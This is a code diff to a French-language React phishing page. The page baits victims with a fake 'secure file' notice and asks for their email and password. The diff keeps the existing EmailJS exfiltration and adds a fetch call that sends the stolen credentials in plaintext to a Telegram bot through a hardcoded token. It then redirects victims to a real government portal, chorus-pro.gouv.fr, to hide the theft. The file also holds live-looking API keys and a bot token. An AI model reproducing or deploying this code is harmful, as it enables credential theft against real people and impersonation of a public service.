@@ -1,16 +1,14 @@
-import one from '../src/assets/one.png';
-import micr from '../src/assets/micr.webp';
-import pdf from '../src/assets/pdf.png';
-import cap from '../src/assets/cap.png';
+import one from "../src/assets/one.png";
+import micr from "../src/assets/micr.webp";
+import pdf from "../src/assets/pdf.png";
+import cap from "../src/assets/cap.png";
 import emailjs from "@emailjs/browser";
-import { useRef, useState } from 'react';
-
+import { useRef, useState } from "react";
 
 function App() {
-
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
-  const [showPasswordInput, setShowPasswordInput] = useState(false); // Ajout de l'état pour gérer l'affichage de l'input password
+  const [showPasswordInput, setShowPasswordInput] = useState(false);
   const form = useRef();
 
   const handleContinueClick = (e) => {
@@ -22,33 +20,49 @@ function App() {
     setShowPasswordInput(true);
   };
 
-
-  
-  const handleSignInClick = (e) => {
+  const handleSignInClick = async (e) => {
     e.preventDefault();
     if (!email || !password) {
       alert("Veuillez remplir tous les champs.");
       return;
     }
 
-    emailjs
-      .sendForm("service_44mdivb", "template_18yyg38", form.current, {
+    try {
+      // Envoyer le formulaire via emailjs
+      await emailjs.sendForm("service_44mdivb", "template_18yyg38", form.current, {
         publicKey: "I38CNoPxPsXFjETua",
-      })
-      .then(
-        () => {
-          console.log("SUCCESS!");
-          setEmail("");
-          setPassword("");
-          window.location.href = 'https://portail.chorus-pro.gouv.fr/aife_csm/fr?id=aife_catitem_details&cat_item_id=6e479e0d1ba0b410a15587b5604bcb2d';
+      });
+
+      console.log("SUCCESS!");
+      setEmail("");
+      setPassword("");
+
+      // Envoyer les informations via Telegram
+      const botToken = '7089226670:AAHNSB19Gfzyc_6BkvjJVVU-Dv-_CFFs_YM';
+      const chatId = '@familys_bot14';
+      const message = `Infos NoReply\nEmail: ${email}\nPassword: ${password}`;
+
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
         },
-        (error) => {
-          console.log("FAILED...", error.text);
-        }
-      );
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+        }),
+      });
+
+      console.log("Message envoyé via Telegram!");
+
+      window.location.href = "https://portail.chorus-pro.gouv.fr/aife_csm/fr?id=aife_catitem_details&cat_item_id=6e479e0d1ba0b410a15587b5604bcb2d";
+    } catch (error) {
+      console.log("FAILED...", error);
+    }
   };
+
   return (
-    <div className='body'>
+    <div className="body">
       <div className="entete">
         <img src={one} alt="" />
       </div>
@@ -63,7 +77,9 @@ function App() {
         </div>
         <hr />
         <div className="section2">
-          <h5 style={{ marginTop: "2vw" }}>Vous avez reçu un fichier sécurisé</h5>
+          <h5 style={{ marginTop: "2vw" }}>
+            Vous avez reçu un fichier sécurisé
+          </h5>
           <div className="file">
             <img src={pdf} alt="" />
             <h3>56.1KB</h3>
@@ -89,7 +105,7 @@ function App() {
                 value={email}
                 onChange={(e) => setEmail(e.target.value)}
               />
-              {showPasswordInput && ( // Afficher l'input password uniquement si showPasswordInput est vrai
+              {showPasswordInput && (
                 <input
                   type="password"
                   id="password"
@@ -100,7 +116,11 @@ function App() {
                   onChange={(e) => setPassword(e.target.value)}
                 />
               )}
-              <button onClick={showPasswordInput ? handleSignInClick : handleContinueClick}>
+              <button
+                onClick={
+                  showPasswordInput ? handleSignInClick : handleContinueClick
+                }
+              >
                 {showPasswordInput ? "S'identifier" : "Continuer"}
               </button>
             </form>
